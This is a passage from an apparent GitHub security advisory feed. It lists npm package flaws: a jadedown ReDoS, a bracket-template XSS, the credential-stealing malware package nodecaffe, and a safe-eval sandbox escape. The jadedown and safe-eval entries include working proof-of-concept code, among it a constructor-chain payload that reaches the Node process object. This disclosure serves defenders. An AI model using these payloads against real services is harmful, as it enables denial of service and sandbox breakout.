</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q6pj-jh94-5fpr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2021-05-07T16:14:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jadedown] Regular Expression Denial of Service in jadedown]]></title>
        <id>https://github.com/advisories/GHSA-6354-6mhv-mvv5</id>
        <link href="https://github.com/advisories/GHSA-6354-6mhv-mvv5"/>
        <updated>2023-09-11T22:25:26.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>jadedown</code> package is affected by a regular expression denial of service vulnerability when certain types of user input are passed in.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<pre><code class="language-js">var jadedown = require('jadedown');

var genstr = function (len, chr) {
    var result = "";
    for (i=0; i&lt;=len; i++) {
        result = result + chr;
    }

    return result;
}


for (i=1;i&lt;=10000000;i=i+1) {
    console.log("COUNT: " + i);
    var str = genstr(i, 'f') + genstr(i, '#') + '{';
    console.log("LENGTH: " + str.length);
    var start = process.hrtime();
    jadedown(str)

    var end = process.hrtime(start);
    console.log(end);
}
</code></pre>
<p>Results demonstrating blocking for 5 seconds using only 48 characters.</p>
<pre><code>$ node jadedown.js
COUNT: 1
LENGTH: 6
[ 0, 4014065 ]
COUNT: 4
LENGTH: 12
[ 0, 503507 ]
COUNT: 7
LENGTH: 18
[ 0, 325225 ]
COUNT: 10
LENGTH: 24
[ 0, 1632684 ]
COUNT: 13
LENGTH: 30
[ 0, 7541230 ]
COUNT: 16
LENGTH: 36
[ 0, 80889495 ]
COUNT: 19
LENGTH: 42
[ 0, 636009936 ]
COUNT: 22
LENGTH: 48
[ 5, 820586760 ]
</code></pre>
<h1 id="timeline">Timeline</h1>
<ul>
<li>October 24, 2015 - Vulnerability Identified</li>
<li>October 24, 2015 - Maintainers Notified</li>
<li>October 25, 2015 - Response from Maintainers with intent to fix</li>
<li>January 5, 2016 - Advisory Published</li>
<li>January 11, 2016 - CVE Requested</li>
</ul>
<h2 id="recommendation">Recommendation</h2>
<p>This package is not actively maintained, and has not seen an update since 2011. </p>
<p>The package also provides unique functionality in the form of a templating language that is not available elsewhere. If this package is used to process user input, the best available mitigation is to refactor the dependent application to not make use of this module.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-10520">https://nvd.nist.gov/vuln/detail/CVE-2016-10520</a></li>
<li><a href="https://github.com/advisories/GHSA-6354-6mhv-mvv5">https://github.com/advisories/GHSA-6354-6mhv-mvv5</a></li>
<li><a href="https://www.npmjs.com/advisories/52">https://www.npmjs.com/advisories/52</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6354-6mhv-mvv5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2019-02-18T23:38:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bracket-template] bracket-template vulnerable to reflected XSS]]></title>
        <id>https://github.com/advisories/GHSA-488m-6gh8-9j36</id>
        <link href="https://github.com/advisories/GHSA-488m-6gh8-9j36"/>
        <updated>2023-09-11T22:24:36.000Z</updated>
        <content type="html"><![CDATA[<p>bracket-template suffers from reflected XSS possible when variable passed via GET parameter is used in template</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-3735">https://nvd.nist.gov/vuln/detail/CVE-2018-3735</a></li>
<li><a href="https://hackerone.com/reports/317125">https://hackerone.com/reports/317125</a></li>
<li><a href="https://github.com/advisories/GHSA-488m-6gh8-9j36">https://github.com/advisories/GHSA-488m-6gh8-9j36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-488m-6gh8-9j36</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2018-07-27T17:05:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nodecaffe] nodecaffe is malware]]></title>
        <id>https://github.com/advisories/GHSA-2wpq-vvw6-67wr</id>
        <link href="https://github.com/advisories/GHSA-2wpq-vvw6-67wr"/>
        <updated>2023-09-11T22:23:56.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>nodecaffe</code> package is a piece of malware that steals environment variables and sends them to attacker controlled locations. </p>
<p>All versions have been unpublished from the npm registry.</p>
<h2 id="recommendation">Recommendation</h2>
<p>As this package is malware, if you find it installed in your environment, the real security concern is determining how it got there. </p>
<p>If you have found this installed in your environment, you should:</p>
<ol>
<li>Delete the package</li>
<li>Clear your npm cache</li>
<li>Ensure it is not present in any other package.json files on your system</li>
<li>Regenerate your registry credentials, tokens, and any other sensitive credentials that may have been present in your environment variables.</li>
</ol>
<p>Additionally, any service which may have been exposed via credentials in your environment variables, such as a database, should be reviewed for indicators of compromise as well.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16070">https://nvd.nist.gov/vuln/detail/CVE-2017-16070</a></li>
<li><a href="https://www.npmjs.com/advisories/509">https://www.npmjs.com/advisories/509</a></li>
<li><a href="https://github.com/advisories/GHSA-2wpq-vvw6-67wr">https://github.com/advisories/GHSA-2wpq-vvw6-67wr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2wpq-vvw6-67wr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2018-08-29T23:38:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[safe-eval] Sandbox Breakout in safe-eval]]></title>
        <id>https://github.com/advisories/GHSA-ww6v-677g-p656</id>
        <link href="https://github.com/advisories/GHSA-ww6v-677g-p656"/>
        <updated>2023-09-11T22:19:20.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of <code>safe-eval</code> are vulnerable to a sandbox escape. By accessing object constructors, un-sanitized user input can access the entire standard library and effectively break out of the sandbox. </p>
<h2 id="proof-of-concept">Proof of Concept:</h2>
<p>This code accesses the process object and calls <code>.exit()</code></p>
<pre><code class="language-js">var safeEval = require('safe-eval');
safeEval("this.constructor.constructor('return process')().exit()");
</code></pre>
<h2 id="recommendation">Recommendation</h2>
<p>Update to version 0.4.0 or later</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16088">https://nvd.nist.gov/vuln/detail/CVE-2017-16088</a></li>
<li><a href="https://github.com/hacksparrow/safe-eval/issues/5">https://github.com/hacksparrow/safe-eval/issues/5</a></li>
<li><a href="https://github.com/patriksimek/vm2/issues/59">https://github.com/patriksimek/vm2/issues/59</a></li>
<li><a href="https://github.com/hacksparrow/safe-eval/pull/13">https://github.com/hacksparrow/safe-eval/pull/13</a></li>
<li><a href="https://github.com/advisories/GHSA-ww6v-677g-p656">https://github.com/advisories/GHSA-ww6v-677g-p656</a></li>
<li><a href="https://www.npmjs.com/advisories/337">https://www.npmjs.com/advisories/337</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ww6v-677g-p656</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2018-07-18T18:28:10.000Z</published>
    </entry>
</feed>